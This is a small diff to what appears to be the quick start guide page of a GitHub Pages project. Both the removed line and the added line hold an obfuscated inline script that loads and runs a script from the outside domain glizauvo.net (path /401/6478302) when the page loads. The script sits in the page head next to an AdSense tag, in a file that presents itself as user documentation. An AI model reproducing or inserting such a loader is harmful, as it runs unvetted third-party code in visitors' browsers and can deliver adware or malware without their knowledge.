@@ -5,7 +5,7 @@ You can also manually navigate your browser to: https://lesferch.github.io/WinSe
 -->
 <head>
 <meta name="google-adsense-account" content="ca-pub-7430036849954417">
-<script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('glizauvo.net',6478302,document.createElement('script'))</script>
+<html><script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('glizauvo.net',6478302,document.createElement('script'))</script></html>
 </head>
 
 This is the quick start guide. For more details, please see the [complete user manual](./Manual.md).
